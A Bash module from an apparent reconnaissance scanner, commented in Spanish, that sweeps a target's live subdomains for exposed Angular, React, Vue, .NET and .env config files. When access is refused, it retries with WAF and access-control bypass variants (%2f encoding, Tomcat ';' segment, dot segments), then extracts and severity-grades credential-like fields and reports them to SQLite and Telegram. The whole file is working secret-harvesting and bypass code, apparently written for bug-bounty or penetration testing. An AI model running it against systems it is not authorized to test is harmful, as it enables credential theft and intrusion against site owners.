#!/usr/bin/env bash
# ============================================================
#  modules/36_spa_config_exposure.sh
#  Fase 36: SPA Runtime Config Exposure
#
#  Los frameworks SPA (Angular, React, Vue) inyectan config en
#  archivos estáticos accesibles sin autenticación. Cuando el
#  servidor no restringe /assets/, cualquier visitante puede
#  leer secrets hardcodeados en producción.
#
#  Rutas sondeadas:
#    Angular:
#      /assets/environments/environment.json  ← más común
#      /assets/environments/environment.prod.json
#      /assets/environment.json
#      /environments/environment.json
#    React / Vue / genérico:
#      /config.json, /runtime-config.json
#      /app.config.json, /__env.js
#      /static/config.json, /public/config.json
#    .NET / Blazor:
#      /appsettings.json, /appsettings.Production.json
#    Node.js:
#      /.env (si accidentalmente desplegado)
#
#  Clasificación de severidad:
#    critical → campo con "private" o "secret" en el nombre +
#               valor que parece credential (len>8, no URL, no bool)
#    high     → clientSecret, client_secret, apiSecret, privateKey
#    medium   → apiKey, api_key, accessToken, password, token
#               con valor no trivial
#    low      → solo URLs internas, client IDs, feature flags
#
#  Técnica adicional: WAF bypass para /assets/
#    Si /assets/ devuelve 403, probar:
#      /assets%2fenvironments%2fenvironment.json  (%2f bypass)
#      /;/assets/environments/environment.json    (Tomcat ;bypass)
#      /assets/./environments/environment.json    (dot segment)
# ============================================================

MODULE_NAME="spa_config_exposure"
MODULE_DESC="SPA Runtime Config Exposure (Angular/React/Vue environment.json)"

# ── Rutas a sondear ───────────────────────────────────────────
SPA_CONFIG_PATHS=(
  # Angular — los más frecuentes primero
  "/assets/environments/environment.json"
  "/assets/environments/environment.prod.json"
  "/assets/environments/environment.staging.json"
  "/assets/environment.json"
  "/assets/app.config.json"
  "/environments/environment.json"
  # React / CRA
  "/config.json"
  "/runtime-config.json"
  "/public/runtime-config.json"
  "/public/config.json"
  "/static/config.json"
  "/static/js/config.js"
  # Vue
  "/app.config.json"
  "/vue.config.json"
  # .NET / Blazor
  "/appsettings.json"
  "/appsettings.Production.json"
  "/appsettings.Development.json"
  "/web.config"
  # Genérico
  "/env.json"
  "/__env.js"
  "/js/config.js"
  "/js/env.js"
  "/app/config.json"
  "/settings.json"
  "/config/config.json"
  "/config/settings.json"
)

# ── Nombres de campo que sugieren credenciales críticas ───────
_field_severity() {
  local KEY="$1" VAL="$2"
  local KEY_LOWER
  KEY_LOWER=$(echo "$KEY" | tr '[:upper:]' '[:lower:]')

  # Valor vacío o no-credential → ignorar
  [[ -z "$VAL" || "$VAL" == "null" || "$VAL" == "true" || "$VAL" == "false" ]] && echo "skip" && return
  [[ "${#VAL}" -lt 6 ]] && echo "skip" && return
  # Valor que parece URL (no suele ser secreto por sí solo)
  echo "$VAL" | grep -qP '^https?://' && echo "info" && return

  if echo "$KEY_LOWER" | grep -qP 'private|secret'; then
    echo "critical"
  elif echo "$KEY_LOWER" | grep -qP 'clientsecret|client_secret|apisecret|api_secret|privatekey|private_key'; then
    echo "high"
  elif echo "$KEY_LOWER" | grep -qP 'apikey|api_key|accesstoken|access_token|password|passwd|token|credential'; then
    echo "medium"
  elif echo "$KEY_LOWER" | grep -qP 'clientid|client_id|appid|app_id|ssoic|ssogf|apigee|inbenta'; then
    echo "low"
  else
    echo "skip"
  fi
}

# ── Extraer secrets de un JSON o JS config ───────────────────
_extract_secrets() {
  local CONTENT="$1"
  python3 - <<EOF 2>/dev/null
import json, re, sys

content = '''${CONTENT//\'/\\\'}'''

# Intentar JSON directo
secrets = {}
try:
    data = json.loads(content)
    def flatten(d, prefix=''):
        for k, v in d.items():
            full_key = f"{prefix}{k}" if not prefix else f"{prefix}.{k}"
            if isinstance(v, dict):
                flatten(v, full_key + '.')
            elif isinstance(v, str) and v:
                secrets[full_key] = v
    flatten(data)
except:
    # Fallback: extraer pares key:value de JS/texto
    for m in re.finditer(r'["\']?(\w+)["\']?\s*[:=]\s*["\']([^"\']{6,})["\']', content):
        secrets[m.group(1)] = m.group(2)

for k, v in secrets.items():
    print(f"{k}|||{v}")
EOF
}

# ── Registrar finding ─────────────────────────────────────────
_spa_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" URL="$3"
  local SEV="$4" DETAIL="$5"

  local EXISTING
  EXISTING=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND target='${URL//\'/\'\'}' AND type='spa_config';" \
    2>/dev/null || echo 1)
  [[ "$EXISTING" != "0" ]] && return

  db_add_finding "$DOMAIN_ID" "spa_config" "$SEV" \
    "$URL" "spa_config_exposure" "$DETAIL"

  local EMOJI="🔴"
  [[ "$SEV" == "high"     ]] && EMOJI="🟠"
  [[ "$SEV" == "medium"   ]] && EMOJI="🟡"
  [[ "$SEV" == "low"      ]] && EMOJI="🔵"

  log_warn "  ⚡ SPA Config [$SEV]: $URL"

  _telegram_send "${EMOJI} *SPA Config Exposure*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📋 Severidad: \`${SEV^^}\`
💡 ${DETAIL:0:350}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
}

# ── Test un subdominio ────────────────────────────────────────
_scan_spa_config() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  for CONFIG_PATH in "${SPA_CONFIG_PATHS[@]}"; do
    local URL="${BASE}${CONFIG_PATH}"
    _h_get "$URL" -H "Accept: application/json, text/plain, */*"
    local STATUS="$HTTP_LAST_STATUS"
    local BODY="$HTTP_LAST_BODY"

    # WAF bypass si 403: probar variantes de encoding del path
    if [[ "$STATUS" == "403" || "$STATUS" == "401" || "$STATUS" == "406" ]]; then
      # Variante 1: %2f en lugar de / en el path del config
      local ENCODED_PATH
      ENCODED_PATH=$(echo "$CONFIG_PATH" | sed 's|/|%2f|g; s|^%2f|/|')
      _h_get "${BASE}${ENCODED_PATH}" -g
      if [[ "$HTTP_LAST_STATUS" == "200" ]]; then
        STATUS="$HTTP_LAST_STATUS"; BODY="$HTTP_LAST_BODY"; URL="${BASE}${ENCODED_PATH}"
      fi

      # Variante 2: Tomcat ;/ bypass — /;/assets/environments/environment.json
      if [[ "$STATUS" != "200" ]]; then
        local SC_PATH="/;${CONFIG_PATH}"
        _h_get "${BASE}${SC_PATH}" -g
        if [[ "$HTTP_LAST_STATUS" == "200" ]]; then
          STATUS="$HTTP_LAST_STATUS"; BODY="$HTTP_LAST_BODY"; URL="${BASE}${SC_PATH}"
        fi
      fi

      # Variante 3: dot segment
      if [[ "$STATUS" != "200" ]]; then
        local DOT_PATH
        DOT_PATH=$(echo "$CONFIG_PATH" | sed 's|/assets/|/assets/./|')
        _h_get "${BASE}${DOT_PATH}" -g
        if [[ "$HTTP_LAST_STATUS" == "200" ]]; then
          STATUS="$HTTP_LAST_STATUS"; BODY="$HTTP_LAST_BODY"; URL="${BASE}${DOT_PATH}"
        fi
      fi
    fi

    [[ "$STATUS" != "200" ]] && continue

    # Verificar que es JSON o JS (no HTML 404)
    echo "$BODY" | grep -qP '^\s*[{\[]|^\s*(var|const|let|window\.)' || continue
    echo "$BODY" | grep -qi '<html\|<!doctype' && continue

    log_info "  [SPA config] $URL → $STATUS"

    # Si es JSON vacío o mínimo, reportar como low (info disclosure de que existe)
    if [[ "${#BODY}" -lt 50 ]]; then
      _spa_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "low" \
        "Archivo de config SPA accesible (vacío/mínimo): ${CONFIG_PATH}"
      continue
    fi

    # Extraer secrets y clasificar
    local MAX_SEV="low"
    local FINDINGS_LIST=()

    while IFS='|||' read -r KEY VAL; do
      [[ -z "$KEY" || -z "$VAL" ]] && continue
      local SEV
      SEV=$(_field_severity "$KEY" "$VAL")
      [[ "$SEV" == "skip" || "$SEV" == "info" ]] && continue

      # Truncar valor para el log (no exponer completo en la DB)
      local VAL_PREVIEW="${VAL:0:8}..."
      FINDINGS_LIST+=("${SEV}:${KEY}=${VAL_PREVIEW}")

      # Actualizar severidad máxima
      case "$SEV/$MAX_SEV" in
        critical/*) MAX_SEV="critical" ;;
        high/low|high/medium) MAX_SEV="high" ;;
        medium/low) MAX_SEV="medium" ;;
      esac
    done < <(_extract_secrets "$BODY")

    if [[ ${#FINDINGS_LIST[@]} -gt 0 ]]; then
      local DETAIL="Config expuesto: ${CONFIG_PATH} | Secrets: ${FINDINGS_LIST[*]:0:5}"
      _spa_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "$MAX_SEV" "$DETAIL"
    else
      # Sin secrets obvios pero el archivo existe — reportar como low
      _spa_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "low" \
        "Config SPA accesible sin secrets obvios: ${CONFIG_PATH} (${#BODY} bytes)"
    fi

    # No probar más paths una vez que encontramos el principal
    [[ "$CONFIG_PATH" == "/assets/environments/environment.json" ]] && break
  done
}

# ══════════════════════════════════════════════════════════════
#  Función principal
# ══════════════════════════════════════════════════════════════
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 36 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local FINDINGS_BEFORE
  FINDINGS_BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='spa_config';" \
    2>/dev/null || echo 0)

  local ALL_SUBS
  if [[ -s "$OUT_DIR/subs_alive.txt" ]]; then
    ALL_SUBS=$(cat "$OUT_DIR/subs_alive.txt")
  else
    ALL_SUBS=$(sqlite3 "$DB_PATH" \
      "SELECT subdomain FROM subdomains
       WHERE domain_id=${DOMAIN_ID} AND status='alive';" 2>/dev/null)
  fi

  local CHECKED=0
  local MAX_WORKERS=8
  local PIDS=()

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    ((CHECKED++))
    (
      _scan_spa_config "https://${SUB}" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    ) &
    PIDS+=($!)
    if [[ ${#PIDS[@]} -ge $MAX_WORKERS ]]; then
      wait "${PIDS[0]}" 2>/dev/null || true
      PIDS=("${PIDS[@]:1}")
    fi
  done <<< "$ALL_SUBS"
  wait "${PIDS[@]}" 2>/dev/null || true

  local FINDINGS_AFTER NEW_FINDINGS
  FINDINGS_AFTER=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='spa_config';" \
    2>/dev/null || echo 0)
  NEW_FINDINGS=$(( FINDINGS_AFTER - FINDINGS_BEFORE ))

  [[ "$NEW_FINDINGS" -gt 0 ]] && \
    _telegram_send "📦 *SPA Config Exposure completado*
🌐 \`${DOMAIN}\`
🔍 Subdominios: \`${CHECKED}\`
⚡ Findings: \`${NEW_FINDINGS}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

  log_ok "$MODULE_DESC: $NEW_FINDINGS findings en $CHECKED subdominios"
}
